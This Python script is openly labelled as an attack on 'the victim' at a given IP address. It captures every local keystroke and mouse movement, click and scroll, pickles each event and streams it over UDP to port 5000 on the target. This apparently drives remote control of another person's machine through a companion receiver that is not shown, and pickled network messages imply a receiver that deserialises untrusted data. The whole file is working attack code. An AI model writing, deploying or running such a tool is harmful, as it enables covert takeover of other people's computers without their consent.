#!/usr/bin/env python3

import sys
from socket import socket, AF_INET, SOCK_DGRAM, gethostbyname_ex, gethostname
from pynput.keyboard import Key, Listener as KeyListener
from pynput.mouse import Listener as MouseListener, Button
import pickle

# Attack the victim at a given IP address
SERVER_IP   = sys.argv[1]
PORT_NUMBER = 5000

SERVER = (SERVER_IP, PORT_NUMBER)
SIZE = 1024
print("Attacking victim at {0}:{1}\n".format(SERVER_IP, PORT_NUMBER))

msg_socket = socket( AF_INET, SOCK_DGRAM )

def on_press(key):
    _key = None
    try:
        _key = '{0}'.format(key.char)
    except:
        _key = '{0}'.format(key)
    msg = {
        "type": "key",
        "action": "press",
        "key": _key
    }
    print(msg)
    msg_socket.sendto(pickle.dumps(msg), SERVER)

def on_release(key):
    _key = None
    try:
        _key = '{0}'.format(key.char)
    except:
        _key = '{0}'.format(key)
    msg = {
        "type": "key",
        "action": "release",
        "key": _key
    }
    print(msg)
    msg_socket.sendto(pickle.dumps(msg), SERVER)

def on_move(x, y):
    msg = {
        "type": "mouse",
        "action": "move",
        "x": x,
        "y": y
    }
    print(msg)
    msg_socket.sendto(pickle.dumps(msg), SERVER)

def on_click(x, y, button, pressed):
    # if button == Button.left:
    #     _button = 'left'
    # elif button == Button.middle:
    #     _button = 'middle'
    # elif button == Button.right:
    #     _button = 'right'

    msg = {
        "type": "mouse",
        "action": "click",
        "button": button,
        "pressed": pressed
    }
    print(msg)
    msg_socket.sendto(pickle.dumps(msg), SERVER)

def on_scroll(x, y, dx, dy):
    msg = {
        "type": "mouse",
        "action": "scroll",
        "x": x,
        "y": y,
        "dx": dx,
        "dy": dy
    }
    print(msg)
    msg_socket.sendto(pickle.dumps(msg), SERVER)


mouse_listener = MouseListener(
    on_move=on_move,
    on_click=on_click,
    on_scroll=on_scroll)
mouse_listener.start()

# Collect events until Ctrl C
with KeyListener(
        on_press=on_press,
        on_release=on_release) as key_listener:
    key_listener.join()
